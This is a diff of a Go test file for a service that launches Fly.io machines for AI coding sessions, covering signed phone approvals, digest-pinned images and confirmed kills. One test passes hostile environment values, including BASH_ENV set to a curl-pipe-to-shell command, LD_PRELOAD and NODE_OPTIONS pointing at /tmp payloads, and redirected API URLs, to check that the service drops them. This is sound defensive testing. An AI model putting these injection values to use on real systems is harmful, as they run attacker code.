@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/ecdh"
 	"crypto/ecdsa"
 	"crypto/elliptic"
@@ -9,16 +10,29 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"io"
+	"log"
 	"math/big"
+	"net/http"
+	"net/http/httptest"
+	"os"
 	"strings"
 	"testing"
 	"time"
 )
 
+// the core's diagnostics (stdout in production) stay out of test output
+func TestMain(m *testing.M) {
+	log.SetOutput(io.Discard)
+	os.Exit(m.Run())
+}
+
 // ---- fakes -------------------------------------------------------------------------------------
 
 type fakeMachine struct {
 	enc, sig  *ecdh.PrivateKey
+	image     string
+	state     string
 	destroyed bool
 	inited    bool
 }
@@ -28,20 +42,21 @@ type fakeFly struct {
 	machines map[string]*fakeMachine
 	token    string
 	env      map[string]string // the last created machine's env
+	guest    map[string]any    // and its guest
 	failInit bool
+	booting  bool   // new machines stay "starting" until told otherwise
+	slowKill bool   // a destroy leaves the machine "destroying" (Fly confirms later)
 	swap     string // report this digest instead of the requested one (a registry serving other bytes)
 }
 
 func newFakeFly() *fakeFly { return &fakeFly{machines: map[string]*fakeMachine{}} }
 
 func (f *fakeFly) Configure(token string) { f.token = token }
-func (f *fakeFly) Create(r StartRequest) (string, string, error) {
+func (f *fakeFly) Create(r StartRequest, guest map[string]any, env map[string]string) (string, error) {
 	f.n++
 	id := fmt.Sprintf("m%d", f.n)
 	e, _ := ecdh.P256().GenerateKey(rand.Reader)
 	s, _ := ecdh.P256().GenerateKey(rand.Reader)
-	f.machines[id] = &fakeMachine{enc: e, sig: s}
-	f.env = r.Env
 	ref, digest, _ := strings.Cut(r.Image, "@")
 	if f.swap != "" {
 		digest = f.swap
@@ -49,7 +64,20 @@ func (f *fakeFly) Create(r StartRequest) (string, string, error) {
 	if i := strings.LastIndex(ref, ":"); i > strings.LastIndex(ref, "/") {
 		ref = ref[:i] // Fly reports registry/repository@digest
 	}
-	return id, ref + "@" + digest, nil
+	state := "started"
+	if f.booting {
+		state = "starting"
+	}
+	f.machines[id] = &fakeMachine{enc: e, sig: s, image: ref + "@" + digest, state: state}
+	f.env, f.guest = env, guest
+	return id, nil
+}
+func (f *fakeFly) Inspect(id string) (FlyMachine, error) {
+	m, ok := f.machines[id]
+	if !ok {
+		return FlyMachine{}, fmt.Errorf("not found")
+	}
+	return FlyMachine{State: m.state, Image: m.image}, nil
 }
 func (f *fakeFly) Init(id string) (MachineKeys, error) {
 	if f.failInit {
@@ -65,11 +93,11 @@ func (f *fakeFly) Destroy(id string) error {
 		return fmt.Errorf("not found")
 	}
 	m.destroyed = true
+	m.state = "destroyed"
+	if f.slowKill {
+		m.state = "destroying"
+	}
 	return nil
-}
-func (f *fakeFly) ConfirmDestroyed(id string) (bool, error) {
-	m, ok := f.machines[id]
-	return ok && m.destroyed, nil
 }
 
 // a P-256 key holder: the iPhone (signing + the Enclave's key agreement, here in software), the master key,
@@ -228,15 +256,24 @@ func tryStart(c *Core, a SignedDoc) (SignedDoc, error) {
 	var ap Approval
 	json.Unmarshal([]byte(a.Payload), &ap)
 	if ap.Request.Image == NullImage {
-		return c.Certify(&a, "")
+		return c.Certify(&a, nil)
 	}
-	st, err := c.Start(StartRequest{Image: ap.Request.Image})
+	st, err := startMachine(c, ap.Request.Image)
 	if err != nil {
 		return SignedDoc{}, err
 	}
-	var m struct{ Machine StartedMachine }
-	json.Unmarshal([]byte(st.Payload), &m)
-	return c.Certify(&a, m.Machine.ID)
+	return c.Certify(&a, &st)
+}
+
+// startMachine: what the router does to start one — create, then init (the fake is up at once)
+func startMachine(c *Core, image string) (SignedDoc, error) {
+	cr, err := c.Start(StartRequest{Image: image, Size: "medium"})
+	if err != nil {
+		return SignedDoc{}, err
+	}
+	var x struct{ ID string }
+	json.Unmarshal([]byte(cr.Payload), &x)
+	return c.Init(x.ID)
 }
 
 func start(t *testing.T, c *Core, a SignedDoc) (SignedDoc, string) {
@@ -352,7 +389,7 @@ func TestResetStartsEmptyAndTakesTheFlyTokenSealed(t *testing.T) {
 	if l := pl(t)(c.Stores("n")); fmt.Sprint(l["stores"]) != "[]" {
 		t.Fatalf("a Reset core has stores: %v", l["stores"])
 	}
-	if _, err := c.Start(StartRequest{Image: img}); err == nil && f.token != "" {
+	if _, err := c.Start(StartRequest{Image: img, Size: "small"}); err == nil && f.token != "" {
 		t.Fatal("a token out of nowhere")
 	}
 	seal := func(info string) Sealed {
@@ -418,8 +455,12 @@ func TestMachinesGetTheCoreKeyFromTheCore(t *testing.T) {
 	evil := map[string]string{coreKeyEnv: "evil", "X": "1", "LD_PRELOAD": "/tmp/x.so", "BASH_ENV": "$(curl evil|sh)",
 		"NODE_OPTIONS": "--require /tmp/x.js", "PATH": "/tmp", "JARVIS2_URL": "http://evil", "ANTHROPIC_BASE_URL": "http://evil",
 		"JARVIS2_ROLLBACK": "x", "JARVIS2_RESTORE_CERT": "{}", "SESSION_PROMPT": "do evil", "SESSION_REPOS": "https://github.com/evil/x"}
-	if _, err := c.Start(StartRequest{Image: img, Env: evil}); err != nil {
-		t.Fatal(err)
+	body, _ := json.Marshal(map[string]any{"image": img, "size": "small", "env": evil})
+	srv := httptest.NewServer(Handler(c))
+	defer srv.Close()
+	resp, err := http.Post(srv.URL+"/start", "application/json", bytes.NewReader(body))
+	if err != nil || resp.StatusCode != 200 {
+		t.Fatalf("start: %v %v", err, resp)
 	}
 	want := map[string]string{coreKeyEnv: c.Key()["signingKey"], machineURLEnv: testMachineURL}
 	if len(f.env) != len(want) || f.env[coreKeyEnv] != want[coreKeyEnv] || f.env[machineURLEnv] != want[machineURLEnv] {
@@ -518,31 +559,54 @@ func TestPhoneSignatureMustCoverExactlyTheChallenge(t *testing.T) {
 func TestAnApprovalMakesOneMachine(t *testing.T) {
 	c, f, p := setup(t)
 	a := approve(t, c, p, SuccessionInput{Image: img, Stores: []string{"default"}})
+	// the core makes one try at reading the keys; a machine whose init fails isn't started, and the router kills it
 	f.failInit = true
-	if _, err := c.Start(StartRequest{Image: img}); err == nil {
+	cr := pl(t)(c.Start(StartRequest{Image: img, Size: "small"}))
+	if cr["kind"] != "created" || cr["id"] != "m1" {
+		t.Fatalf("start: %v", cr)
+	}
+	if _, err := c.Init("m1"); err == nil {
 		t.Fatal("started without the machine's keys")
 	}
-	if !f.machines["m1"].destroyed {
-		t.Fatal("a machine whose init failed was left running")
-	}
+	pl(t)(c.KillWithSnapshot("m1", nil))
 	f.failInit = false
+	if _, err := c.Init("m1"); err == nil {
+		t.Fatal("initialised a killed machine")
+	}
+	if _, err := c.Init("ghost"); err == nil {
+		t.Fatal("initialised a machine this core didn't create")
+	}
 	for _, bad := range []string{"ghcr.io/de0ch/other:1", "ghcr.io/de0ch/other@sha256:" + strings.Repeat("1", 64),
 		"ghcr.io/de0ch/jarvis2-session:1", "ghcr.io/de0ch/jarvis2-session:latest", "evil.io/de0ch/jarvis2-session@sha256:" + strings.Repeat("1", 64)} {
-		if _, err := c.Start(StartRequest{Image: bad}); err == nil {
+		if _, err := c.Start(StartRequest{Image: bad, Size: "small"}); err == nil {
 			t.Fatalf("started %s (another repository, or not pinned by digest)", bad)
 		}
 	}
-	other := pl(t)(c.Start(StartRequest{Image: "ghcr.io/de0ch/jarvis2-session:3@sha256:" + strings.Repeat("3", 64)}))["machine"].(map[string]any)["id"].(string)
-	if _, err := c.Certify(&a, other); err == nil {
+	other, err := startMachine(c, "ghcr.io/de0ch/jarvis2-session:3@sha256:"+strings.Repeat("3", 64))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := c.Certify(&a, &other); err == nil {
 		t.Fatal("certified a machine running another image")
 	}
-	_, id := start(t, c, a)
+	mine, err := startMachine(c, img)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := c.Init(machineOf(mine)); err == nil {
+		t.Fatal("initialised a machine twice")
+	}
+	pl(t)(c.Certify(&a, &mine))
 	if _, err := tryStart(c, a); err == nil {
 		t.Fatal("one approval made two machines")
 	}
 	b := approve(t, c, p, SuccessionInput{Image: img, Stores: []string{"gmail"}})
-	if _, err := c.Certify(&b, id); err == nil {
+	if _, err := c.Certify(&b, &mine); err == nil {
 		t.Fatal("one machine got two lines")
+	}
+	forgedStart := SignedDoc{Payload: other.Payload, Sig: mine.Sig}
+	if _, err := c.Certify(&b, &forgedStart); err == nil {
+		t.Fatal("certified a started document the core didn't sign")
 	}
 	forged := SignedDoc{Payload: a.Payload, Sig: newPhone().sign(a.Payload)}
 	if _, err := tryStart(c, forged); err == nil {
@@ -562,7 +626,7 @@ func TestResumeByDeadMachineExactlyOnce(t *testing.T) {
 	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
 		t.Fatal("resumed from a live machine")
 	}
-	if _, err := c.Kill(old); err != nil {
+	if _, err := c.KillWithSnapshot(old, nil); err != nil {
 		t.Fatal(err)
 	}
 	a := pl(t)(c.ApproveByDeadMachine(&ch))
@@ -572,7 +636,7 @@ func TestResumeByDeadMachineExactlyOnce(t *testing.T) {
 	ad, _ := c.ApproveByDeadMachine(&ch)
 	start(t, c, ad)
 	// the same predecessor can't have a second successor (no fork), even if killed again
-	c.Kill(old)
+	c.KillWithSnapshot(old, nil)
 	ch2, _ := c.Succession(in)
 	if _, err := c.ApproveByDeadMachine(&ch2); err == nil {
 		t.Fatal("forked: a used predecessor got a second approval")
@@ -588,7 +652,7 @@ func TestApproveByDeadMachineRefusesChanges(t *testing.T) {
 	cert, old := newLine(t, c, p, "default")
 	var oc Cert
 	json.Unmarshal([]byte(cert.Payload), &oc)
-	c.Kill(old)
+	c.KillWithSnapshot(old, nil)
 	for _, in := range []SuccessionInput{
 		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default", "gmail"}},
 		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}, Options: Options{Harness: "opencode"}},
@@ -609,7 +673,7 @@ func TestUpgradeIsApprovedBeforeTheOldMachineGoes(t *testing.T) {
 	if _, err := tryStart(c, a); err == nil {
 		t.Fatal("started a successor while the predecessor runs")
 	}
-	c.Kill(old)
+	c.KillWithSnapshot(old, nil)
 	start(t, c, a)
 	a2 := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}})
 	if _, err := tryStart(c, a2); err == nil {
@@ -634,7 +698,7 @@ func TestBurnIsASuccessionToTheNullImage(t *testing.T) {
 	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
 		t.Fatal("burned a live machine")
 	}
-	c.Kill(old)
+	c.KillWithSnapshot(old, nil)
 	a, err := c.ApproveByDeadMachine(&ch)
 	if err != nil {
 		t.Fatal(err)
@@ -657,10 +721,10 @@ func TestBurnIsASuccessionToTheNullImage(t *testing.T) {
 
 func TestKillRejectsNullAndUnconfirmed(t *testing.T) {
 	c, _, _ := setup(t)
-	if _, err := c.Kill("null"); err == nil {
+	if _, err := c.KillWithSnapshot("null", nil); err == nil {
 		t.Fatal("killed null")
 	}
-	if _, err := c.Kill("ghost"); err == nil {
+	if _, err := c.KillWithSnapshot("ghost", nil); err == nil {
 		t.Fatal("a machine Fly doesn't know counted as killed")
 	}
 }
@@ -706,7 +770,7 @@ func TestAddAStoreToARunningSession(t *testing.T) {
 		}
 	}
 	// a killed machine can't grow its set, and a resume from it keeps the grown set automatically
-	c.Kill(id)
+	c.KillWithSnapshot(id, nil)
 	chr, _ := c.Succession(SuccessionInput{Predecessor: &c2, Image: f.machineImage(c, &c2), Stores: set})
 	a, err := c.ApproveByDeadMachine(&chr)
 	if err != nil {
@@ -856,7 +920,7 @@ func TestTheLineIdSurvivesResume(t *testing.T) {
 	}
 	var oc Cert
 	json.Unmarshal([]byte(cert.Payload), &oc)
-	c.Kill(first)
+	c.KillWithSnapshot(first, nil)
 	ch, _ := c.Succession(SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}})
 	a, _ := c.ApproveByDeadMachine(&ch)
 	cert2, second := start(t, c, a)
@@ -873,7 +937,7 @@ func TestRaisingToBypassOnResumeNeedsThePhone(t *testing.T) {
 	}
 	var oc Cert
 	json.Unmarshal([]byte(cert.Payload), &oc)
-	c.Kill(first)
+	c.KillWithSnapshot(first, nil)
 	ch, _ := c.Succession(SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"},
 		Options: Options{Harness: "claude", PermissionMode: "bypass"}})
 	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
@@ -890,4 +954,57 @@ func TestTwoIdenticalNewSessionsBothStart(t *testing.T) {
 	c, _, p := setup(t)
 	newLine(t, c, p, "default")
 	newLine(t, c, p, "default")
+}
+
+func machineOf(started SignedDoc) string {
+	var x struct{ Machine StartedMachine }
+	json.Unmarshal([]byte(started.Payload), &x)
+	return x.Machine.ID
+}
+
+func TestStartIsOneCreateAndInitWaitsForFly(t *testing.T) {
+	c, f, _ := setup(t)
+	if _, err := c.Start(StartRequest{Image: img, Size: "huge"}); err == nil {
+		t.Fatal("started an unknown size (no silent default)")
+	}
+	if _, err := c.Start(StartRequest{Image: img}); err == nil {
+		t.Fatal("started with no size")
+	}
+	pl(t)(c.Start(StartRequest{Image: img, Size: "large"}))
+	if f.guest["memory_mb"] != 8192 {
+		t.Fatalf("guest: %v", f.guest)
+	}
+	f.booting = true
+	cr := pl(t)(c.Start(StartRequest{Image: img, Size: "small"}))
+	id := cr["id"].(string)
+	if _, err := c.Init(id); err == nil || err.(*Err).Status != 409 {
+		t.Fatalf("init of a booting machine: %v", err)
+	}
+	f.machines[id].state = "started"
+	st := pl(t)(c.Init(id))
+	m := st["machine"].(map[string]any)
+	if st["kind"] != "started" || m["requested"] != img || m["image"] != f.machines[id].image || m["signingKey"] == "" {
+		t.Fatalf("started: %v", st)
+	}
+}
+
+func TestKillIsOneDestroyConfirmedByFly(t *testing.T) {
+	c, f, p := setup(t)
+	_, id := newLine(t, c, p, "default")
+	f.slowKill = true
+	if _, err := c.KillWithSnapshot(id, nil); err == nil || err.(*Err).Status != 409 {
+		t.Fatalf("killed before Fly reported destroyed: %v", err)
+	}
+	if c.isKilled(id) {
+		t.Fatal("marked killed without Fly")
+	}
+	f.machines[id].state = "destroyed"
+	k := pl(t)(c.KillWithSnapshot(id, nil))
+	if k["kind"] != "killed" || !c.isKilled(id) {
+		t.Fatalf("kill: %v", k)
+	}
+	if _, ok := c.signing[id]; ok {
+		t.Fatal("a killed machine's key is still kept")
+	}
+	pl(t)(c.KillWithSnapshot(id, nil)) // again: the same answer
 }
